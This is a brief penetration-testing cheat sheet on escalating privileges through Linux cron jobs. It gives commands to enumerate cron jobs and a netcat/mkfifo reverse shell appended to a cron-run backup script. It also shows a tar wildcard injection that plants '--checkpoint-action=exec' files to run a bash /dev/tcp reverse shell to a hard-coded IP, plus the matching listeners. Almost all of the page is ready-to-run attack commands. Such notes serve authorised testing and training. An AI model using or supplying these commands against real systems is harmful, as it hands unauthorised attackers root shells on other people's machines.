# Cron jobs

_<mark style="background-color:purple;">**Enumerate cron jobs**</mark>_

```sh
ls -lah /etc/cron*
sudo crontab -l
grep "CRON" /var/log/syslog
cat /etc/cron.d/*
```

_<mark style="background-color:purple;">**add a reverse shell to cronjob**</mark>_

{% code overflow="wrap" %}
```powershell
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 1234 >/tmp/f" >> user_backups.sh
```
{% endcode %}

`nc -lvnp 1234`&#x20;



### Cron jobs with tar wildcards:

* e.g `CRON[185223]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)`

Create 2 special files for tar:

```sh
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=sh\ shell.sh
```

Create shell.sh:

{% code overflow="wrap" %}
```sh
echo "bash -i >& /dev/tcp/192.168.45.214/1111 0>&1" > shell.sh

chmod +x shell.sh
```
{% endcode %}

Set up listener on kali:

`nc -lvnp 1111`
